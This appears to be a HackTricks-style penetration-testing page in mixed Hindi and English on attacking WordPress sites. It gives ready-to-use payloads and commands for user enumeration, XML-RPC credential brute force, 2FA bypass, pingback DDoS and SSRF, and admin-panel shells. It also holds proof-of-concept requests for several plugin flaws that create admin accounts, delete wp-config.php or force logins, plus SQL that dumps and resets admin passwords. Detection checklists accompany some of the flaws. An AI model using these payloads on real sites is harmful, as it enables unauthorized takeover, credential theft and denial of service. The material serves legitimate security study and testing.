# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

- **अपलोड की गई** फ़ाइलें इसी जगह जाती हैं: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** इसलिए अगर आप theme के कुछ php बदलकर RCE हासिल करना चाहते हैं तो आप शायद वही path इस्तेमाल करेंगे। उदाहरण के लिए: theme **twentytwelve** का उपयोग करते समय आप इस फ़ाइल को एक्सेस कर सकते हैं: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **एक और उपयोगी URL हो सकता है:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` में आप database के root password जैसी जानकारी पा सकते हैं।
- जाँच करने के लिए डिफ़ॉल्ट लॉगिन paths: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` में उपयोगी जानकारी होती है जैसे इंस्टॉल किया गया WordPress का version।
- `wp-activate.php` नया WordPress साइट सेटअप करते समय ईमेल activation प्रक्रिया के लिए उपयोग होता है।
- Login फ़ोल्डर (छिपाने के लिए नाम बदला जा सकता है):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` एक फ़ाइल है जो WordPress की उस सुविधा को दर्शाती है जो HTTP को transport mechanism और XML को encoding mechanism के रूप में उपयोग करके डेटा ट्रांसमिट करने में सक्षम बनाती है। इस तरह की संचार विधि को WordPress के [REST API](https://developer.wordpress.org/rest-api/reference) ने बदल दिया है।
- `wp-content` फ़ोल्डर मुख्य डायरेक्टरी है जहाँ plugins और themes संग्रहित होते हैं।
- `wp-content/uploads/` वह डायरेक्टरी है जहाँ प्लेटफ़ॉर्म पर अपलोड की गई कोई भी फ़ाइलें संग्रहीत होती हैं।
- `wp-includes/` यह वह डायरेक्टरी है जहाँ core फ़ाइलें संग्रहीत होती हैं, जैसे certificates, fonts, JavaScript फ़ाइलें, और widgets।
- `wp-sitemap.xml` WordPress के version 5.5 और उससे बड़े में, WordPress सभी public posts और publicly queryable post types और taxonomies के साथ एक sitemap XML फ़ाइल जेनरेट करता है।

**Post exploitation**

- `wp-config.php` फ़ाइल में WordPress को database से कनेक्ट करने के लिए आवश्यक जानकारी होती है जैसे database का नाम, database host, username और password, authentication keys और salts, और database table prefix। यह configuration फ़ाइल DEBUG mode को activate करने के लिए भी इस्तेमाल की जा सकती है, जो troubleshooting में उपयोगी हो सकता है।

### Users Permissions

- **Administrator**
- **Editor**: अपने और अन्य के posts को प्रकाशित और प्रबंधित करता है
- **Author**: अपने खुद के posts को प्रकाशित और प्रबंधित करता है
- **Contributor**: अपने posts लिखता और प्रबंधित करता है लेकिन उन्हें प्रकाशित नहीं कर सकता
- **Subscriber**: पोस्ट ब्राउज़ करता है और अपना प्रोफाइल संपादित कर सकता है

## **Passive Enumeration**

### **Get WordPress version**

जांचें कि क्या आप `/license.txt` या `/readme.html` फ़ाइलें ढूँढ़ सकते हैं

पेज के **source code** के अंदर (उदाहरण [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS लिंक फ़ाइलें

![](<../../images/image (533).png>)

- JavaScript फ़ाइलें

![](<../../images/image (524).png>)

### प्लगइन्स प्राप्त करें
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### थीम प्राप्त करें
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### सामान्य तौर पर संस्करण निकालना
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

शायद आप सभी Plugins और Themes को खोज पाना संभव नहीं होगा। इन्हें खोजने के लिए, आपको **actively Brute Force a list of Plugins and Themes** करना होगा (आशा है कि हमारे लिए ऐसे स्वचालित टूल मौजूद हैं जिनमें ये सूचियाँ होती हैं)।

### उपयोगकर्ता

- **ID Brute:** आप WordPress साइट से वैध उपयोगकर्ता Brute Forcing users IDs करके प्राप्त करते हैं:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
यदि response कोड **200** या **30X** हैं, तो इसका मतलब है कि id **मान्य** है। यदि response कोड **400** है, तो id **अमान्य** है।

- **wp-json:** आप उपयोगकर्ताओं के बारे में जानकारी प्राप्त करने के लिए क्वेरी कर सकते हैं:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
एक और `/wp-json/` endpoint जो उपयोगकर्ताओं के बारे में कुछ जानकारी उजागर कर सकता है:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ध्यान दें कि यह एंडपॉइंट केवल उन उपयोगकर्ताओं को प्रदर्शित करता है जिन्होंने पोस्ट की है। **सिर्फ उन उपयोगकर्ताओं की जानकारी प्रदान की जाएगी जिनके लिए यह फीचर सक्षम है।**

साथ ही ध्यान दें कि **/wp-json/wp/v2/pages** IP addresses को leak कर सकता है।

- **Login username enumeration**: जब **`/wp-login.php`** पर लॉगिन करते समय **संदेश** इस बात के अनुसार **अलग** होता है कि **उपयोगकर्ता नाम मौजूद है या नहीं**।

### XML-RPC

यदि `xml-rpc.php` सक्रिय है, तो आप credentials brute-force कर सकते हैं या इसका उपयोग अन्य संसाधनों पर DoS attacks लॉन्च करने के लिए कर सकते हैं। (उदाहरण के लिए आप इस प्रक्रिया को स्वचालित कर सकते हैं [using this](https://github.com/relarizky/wpxploit))।

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**जाँच करें**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** या **`metaWeblog.getUsersBlogs`** कुछ ऐसे मेथड हैं जिनका उपयोग brute-force credentials के लिए किया जा सकता है। यदि आप इनमें से कोई भी पा लेते हैं तो आप कुछ इस तरह भेज सकते हैं:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
यदि क्रेडेंशियल्स वैध नहीं हैं तो 200 कोड रिस्पॉन्स के अंदर संदेश _"Incorrect username or password"_ दिखाई देना चाहिए।

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

सही क्रेडेंशियल्स का उपयोग करके आप एक फ़ाइल अपलोड कर सकते हैं। प्रतिक्रिया में पथ दिखाई देगा ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

यह तरीका programs के लिए बनाया गया है और humans के लिए नहीं, और पुराना है, इसलिए यह 2FA को सपोर्ट नहीं करता। तो, अगर आपके पास वैध creds हैं पर मुख्य प्रवेश 2FA से सुरक्षित है, **तो आप xmlrpc.php का दुरुपयोग करके उन creds के साथ 2FA बाइपास करते हुए login करने में सक्षम हो सकते हैं**। ध्यान दें कि आप console के माध्यम से जो सभी actions कर सकते हैं वे सभी करने में सक्षम नहीं होंगे, लेकिन आप फिर भी RCE तक पहुँच सकते हैं जैसा Ippsec इसे [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) में समझाते हैं।

**DDoS or port scanning**

अगर आप list के अंदर _**pingback.ping**_ method पा लेते हैं तो आप Wordpress को किसी भी host/port पर arbitrary request भेजवा सकते हैं।\
इसे इस्तेमाल करके आप **हज़ारों** Wordpress **sites** को किसी एक **location** को **access** करने के लिए कह सकते हैं (जिससे उस location पर **DDoS** हो सकता है) या आप इसे **Wordpress** को किसी internal **network** को **scan** कराने के लिए भी इस्तेमाल कर सकते हैं (आप किसी भी पोर्ट का संकेत दे सकते हैं)।
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

यदि आपको **faultCode** का मान **0** से बड़ा (17) मिलता है, तो इसका मतलब है कि पोर्ट खुला है।

पिछले सेक्शन में **`system.multicall`** के उपयोग को देखिए ताकि यह सीखा जा सके कि इस विधि का दुरुपयोग करके DDoS कैसे किया जा सकता है।

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

This file usually exists under the root of the Wordpress site: **`/wp-cron.php`**\
जब इस फ़ाइल को **accessed** किया जाता है तो एक "**heavy**" MySQL **query** perform की जाती है, इसलिए इसे **attackers** द्वारा **cause** करने के लिए इस्तेमाल किया जा सकता है **DoS** के लिये।\
डिफ़ॉल्ट रूप से, `wp-cron.php` हर पेज लोड पर कॉल किया जाता है (जब भी कोई क्लाइंट कोई भी Wordpress पेज रिक्वेस्ट करता है), जो हाई-ट्रैफ़िक साइट्स पर समस्याएँ (DoS) पैदा कर सकता है।

सुझाव है कि Wp-Cron को निष्क्रिय करें और host के अंदर एक वास्तविक cronjob बनाएं जो आवश्यक क्रियाएँ नियमित अंतराल पर करे (बिना समस्याएँ उत्पन्न किए)।

### /wp-json/oembed/1.0/proxy - SSRF

कोशिश करें कि _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ को access करने की और Wordpress साइट संभवतः आप पर एक रिक्वेस्ट कर सकती है।

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

यह टूल जाँचता है कि **methodName: pingback.ping** और path **/wp-json/oembed/1.0/proxy** मौजूद है या नहीं, और यदि मौजूद है तो यह इन्हें exploit करने की कोशिश करता है।

## स्वचालित टूल्स
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## एक बिट को ओवरराइट करके एक्सेस प्राप्त करें

असल हमले की तुलना में यह एक जिज्ञासा है। CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) में आप किसी भी wordpress फ़ाइल का 1 बिट flip कर सकते थे। इसलिए आप फ़ाइल `/var/www/html/wp-includes/user.php` के पोजिशन `5389` के बिट को flip करके NOT (`!`) ऑपरेशन को NOP कर सकते थे।
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **पैनल RCE**

**थीम में उपयोग किए गए php को संशोधित करना (admin credentials आवश्यक)**

Appearance → Theme Editor → 404 Template (दाईं तरफ़)

php शेल के लिए कंटेंट बदलें:

![](<../../images/image (384).png>)

इंटरनेट पर खोजें कि आप उस अपडेट की गई पेज तक कैसे पहुँच सकते हैं। इस मामले में आपको यहाँ एक्सेस करना होगा: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

आप इस्तेमाल कर सकते हैं:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

यह संभव हो सकता है कि .php फाइलों को एक plugin के रूप में अपलोड किया जा सके।\
अपने php backdoor को उदाहरण के लिए बनाएं:

![](<../../images/image (183).png>)

फिर एक नया plugin जोड़ें:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Procced पर क्लिक करें:

![](<../../images/image (70).png>)

शायद यह स्पष्ट रूप से कुछ नहीं करेगा, लेकिन अगर आप Media पर जाएं, तो आप अपना shell अपलोड हुआ देखेंगे:

![](<../../images/image (462).png>)

इसे एक्सेस करें और आप reverse shell को execute करने के लिए URL देखेंगे:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

यह तरीका एक vulnerable के रूप में जाना जाने वाले malicious plugin की installation में शामिल है और इसे exploit करके web shell प्राप्त किया जा सकता है। यह प्रक्रिया WordPress dashboard के माध्यम से निम्नानुसार की जाती है:

1. **Plugin Acquisition**: Plugin को Exploit DB जैसे स्रोत से प्राप्त किया जाता है, जैसे [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard पर जाएं, फिर `Dashboard > Plugins > Upload Plugin` पर जाएं।
- डाउनलोड की गई plugin की zip फ़ाइल अपलोड करें।
3. **Plugin Activation**: एक बार plugin सफलतापूर्वक इंस्टॉल हो जाने के बाद, इसे dashboard के माध्यम से activate करना होगा।
4. **Exploitation**:
- जब plugin "reflex-gallery" इंस्टॉल और activated हो, तो इसे exploit किया जा सकता है क्योंकि यह vulnerable के रूप में जाना जाता है।
- Metasploit framework इस vulnerability के लिए एक exploit प्रदान करता है। उपयुक्त module लोड करके और specific commands execute करके, एक meterpreter session स्थापित किया जा सकता है, जो site तक unauthorized access देता है।
- ध्यान दें कि यह WordPress साइट को exploit करने के कई तरीकों में से सिर्फ एक है।

यह सामग्री WordPress dashboard में plugin इंस्टॉल और activate करने के चरणों का दृश्य प्रदर्शन करती है। हालाँकि, यह महत्वपूर्ण है कि बिना उचित अनुमति के इस तरह kwetsbaarताएँ exploit करना गैरकानूनी और अनैतिक है। इस जानकारी का उपयोग जिम्मेदारी से और केवल कानूनी संदर्भ में किया जाना चाहिए, जैसे explicit permission के साथ penetration testing।

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ एक script है जिसे WordPress में Cross-Site Scripting (XSS) vulnerability को Remote Code Execution (RCE) या अन्य critical vulnerabilities में escalate करने के लिए डिज़ाइन किया गया है। अधिक जानकारी के लिए [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) देखें। यह **Wordpress Versions 6.X.X, 5.X.X और 4.X.X** का समर्थन प्रदान करता है और निम्न करने की अनुमति देता है:
- _**Privilege Escalation:**_ Creates an user in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edit a Built-In Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
एडमिन का पासवर्ड बदलें:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress प्लगइन्स Pentest

### Attack Surface

यह जानना कि कोई Wordpress plugin किस तरह कार्यक्षमता को expose कर सकता है, उसकी functionality में कमजोरियाँ खोजने के लिए महत्वपूर्ण है। आप नीचे दिए गए बुलेट पॉइंट्स में देख सकते हैं कि एक plugin functionality को कैसे expose कर सकता है और vulnerable plugins के कुछ उदाहरण [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) में दिए गए हैं।

- **`wp_ajax`**

एक तरीके जिनसे एक plugin functions को expose कर सकता है, वह AJAX handlers के माध्यम से होता है। इनमें logic, authorization, या authentication बग हो सकते हैं। इसके अलावा, अक्सर ये functions authentication और authorization दोनों को एक wordpress nonce की मौजूदगी पर आधारित करते हैं जो **any user authenticated in the Wordpress instance might have** (इसके role से स्वतंत्र)।  

निम्नलिखित functions वे हैं जिन्हें एक plugin में एक फ़ंक्शन को expose करने के लिए इस्तेमाल किया जा सकता है:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` का उपयोग endpoint को किसी भी उपयोगकर्ता (यहाँ तक कि अप्रमाणित उपयोगकर्ताओं) के लिए सुलभ बनाता है।**

> [!CAUTION]
> इसके अलावा, अगर फ़ंक्शन केवल `wp_verify_nonce` फ़ंक्शन से उपयोगकर्ता के अधिकार की जाँच कर रहा है, तो यह फ़ंक्शन केवल यह जांचता है कि उपयोगकर्ता लॉग इन है; यह आम तौर पर उपयोगकर्ता की भूमिका की जाँच नहीं करता है। इसलिए कम-प्रिविलेज़ वाले उपयोगकर्ताओं को उच्च-प्रिविलेज़ वाली क्रियाओं तक पहुँच मिल सकती है।

- **REST API**

यह भी संभव है कि `register_rest_route` फ़ंक्शन का उपयोग करके wordpress से फ़ंक्शन्स को REST API के माध्यम से एक्सपोज़ किया जाए:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` एक callback फ़ंक्शन है जो जांचता है कि दिया गया उपयोगकर्ता API मेथड को कॉल करने के लिए अधिकृत है या नहीं।

**यदि बिल्ट-इन `__return_true` फ़ंक्शन का उपयोग किया गया है, तो यह यूज़र परमिशन चेक को सीधे स्किप कर देगा।**

- **php फ़ाइल तक सीधे एक्सेस**

बेशक, Wordpress PHP का उपयोग करता है और plugins के अंदर की फाइलें वेब से सीधे पहुँचने योग्य होती हैं। इसलिए, अगर कोई plugin कोई vulnerable functionality एक्सपोज़ कर रहा है जो सिर्फ फाइल को एक्सेस करने मात्र से ट्रिगर हो जाती है, तो वह किसी भी उपयोगकर्ता द्वारा exploitable होगी।

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

कुछ plugins internal integrations या reverse proxies के लिए “trusted header” shortcuts लागू करते हैं और फिर उस header का उपयोग REST requests के लिए current user context सेट करने में करते हैं। यदि वह header upstream component द्वारा request से cryptographically बाउंड नहीं है, तो एक attacker उसे spoof कर सकता है और administrator के रूप में privileged REST routes तक पहुँच सकता है।

- प्रभाव: बिना प्रमाणीकरण के privilege escalation करके admin बनने का रास्ता — core users REST route के माध्यम से नया administrator बनाकर।
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (यह user ID 1 जबरदस्ती सेट करता है, आम तौर पर पहला administrator अकाउंट)।
- Exploited route: `POST /wp-json/wp/v2/users` एक elevated role array के साथ।

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
क्यों यह काम करता है

- प्लगइन एक क्लाइंट-नियंत्रित हेडर को प्रमाणीकरण स्थिति से मैप करता है और capability checks को स्किप कर देता है।
- WordPress core इस route के लिए `create_users` capability की अपेक्षा करता है; प्लगइन hack इसे बाइपास करता है द्वारा हेडर से सीधे current user context सेट करके।

अपेक्षित सफलता संकेत

- HTTP 201 के साथ एक JSON बॉडी जो बनाए गए user का विवरण देती है।
- एक नया admin user जो `wp-admin/users.php` में दिखाई देता है।

डिटेक्शन चेकलिस्ट

- Grep करके खोजें `getallheaders()`, `$_SERVER['HTTP_...']`, या vendor SDKs जो custom headers पढ़कर user context सेट करते हैं (उदा., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- REST registrations की समीक्षा करें ताकि ऐसे privileged callbacks मिलें जिनमें मजबूत `permission_callback` checks नहीं हैं और जो request headers पर निर्भर करते हैं।
- ऐसे उपयोग ढूँढें जहाँ core user-management functions (`wp_insert_user`, `wp_create_user`) REST handlers के अंदर उपयोग किए गए हैं और केवल header values से gated हैं।

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes और plugins अक्सर `wp_ajax_` और `wp_ajax_nopriv_` hooks के माध्यम से AJAX handlers को एक्सपोज़ करते हैं।  जब **_nopriv_** variant का उपयोग होता है **callback अनप्रमाणीकृत विज़िटर्स के लिए पहुँच योग्य हो जाता है**, इसलिए किसी भी संवेदनशील कार्रवाई को अतिरिक्त रूप से यह लागू करना चाहिए:

1. एक **capability check** (उदा. `current_user_can()` या कम से कम `is_user_logged_in()`), और
2. एक **CSRF nonce** जिसे `check_ajax_referer()` / `wp_verify_nonce()` के साथ validate किया गया हो, और
3. **Strict input sanitisation / validation**।

The Litho multipurpose theme (< 3.1) ने इन तीन कंट्रोल्स को *Remove Font Family* फीचर में भूल गया था और परिणामस्वरूप निम्नलिखित कोड (सरलीकृत) शिप हो गया:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Unauthenticated access** – the `wp_ajax_nopriv_` hook रजिस्टर किया गया है।
* **No nonce / capability check** – कोई भी विज़िटर endpoint तक पहुँच सकता है।
* **No path sanitisation** – उपयोगकर्ता–नियंत्रित `fontfamily` स्ट्रिंग बिना फ़िल्टर किए फ़ाइल सिस्टम पथ के साथ जोड़ दी जाती है, जिससे क्लासिक `../../` traversal संभव हो जाता है।

#### Exploitation

एक attacker एक ही HTTP POST अनुरोध भेजकर किसी भी फ़ाइल या डायरेक्टरी को **uploads base directory के नीचे** (आम तौर पर `<wp-root>/wp-content/uploads/`) से डिलीट कर सकता है:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### डिटेक्शन चेकलिस्ट

* कोई भी `add_action( 'wp_ajax_nopriv_...')` callback जो filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, आदि) को कॉल करता हो।
* paths में unsanitised user input का concatenation (देखें: `$_POST`, `$_GET`, `$_REQUEST`)।
* `check_ajax_referer()` और `current_user_can()`/`is_user_logged_in()` की अनुपस्थिति।

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
क्यों यह exploitable है

- सर्वर-साइड authorization के बिना `$_REQUEST['reset-for']` और एक plugin option पर भरोसा करता है।
- यदि किसी उपयोगकर्ता के higher privileges पहले `_asenha_view_admin_as_original_roles` में सहेजे गए थे और उन्हें downgraded किया गया हो, तो वे reset path पर जाकर उन्हें पुनर्स्थापित कर सकते हैं।
- कुछ deployments में, कोई भी authenticated उपयोगकर्ता किसी अन्य username के लिए reset ट्रिगर कर सकता है, जो अभी भी `viewing_admin_as_role_are` में मौजूद है (broken authorization).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- उन role-switching फीचर्स की तलाश करें जो user meta में “original roles” को स्थायी रूप से सेव करते हैं (उदा., `_asenha_view_admin_as_original_roles`)।
- ऐसे reset/restore paths पहचानें जो:
  - `$_REQUEST` / `$_GET` / `$_POST` से usernames पढ़ते हैं।
  - बिना `current_user_can()` और `wp_verify_nonce()` / `check_admin_referer()` के `add_role()` / `remove_role()` के माध्यम से roles बदलते हैं।
  - actor की capabilities के बजाय plugin option array (उदा., `viewing_admin_as_role_are`) के आधार पर authorize करते हैं।

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Some plugins wire user-switching helpers to the public `init` hook and derive identity from a client-controlled cookie. If the code calls `wp_set_auth_cookie()` without verifying authentication, capability and a valid nonce, any unauthenticated visitor can force login as an arbitrary user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
यह क्यों शोषण योग्य है

- सार्वजनिक `init` hook हैंडलर को अप्रमाणीकृत उपयोगकर्ताओं के लिए पहुँच योग्य बनाता है (कोई `is_user_logged_in()` गार्ड नहीं)।
- पहचान क्लाइंट-परिवर्तनीय कुकी (`original_user_id`) से ली जाती है।
- सीधा कॉल `wp_set_auth_cookie($uid)` अनुरोधकर्ता को उस उपयोगकर्ता के रूप में लॉग इन कर देता है बिना किसी capability/nonce checks के।

शोषण (अप्रमाणीकृत)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs व्यापक पैटर्न (SQLi, XSS, LFI) के लिए ट्यून किए जाते हैं। कई उच्च-प्रभाव वाले WordPress/plugin दोष अनुप्रयोग-विशिष्ट लॉजिक/प्रमाणीकरण बग होते हैं जो इंजन WordPress routes और plugin semantics को समझे बिना वैध ट्रैफ़िक जैसा दिखते हैं।

Offensive notes

- plugin-विशिष्ट endpoints को clean payloads के साथ लक्षित करें: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
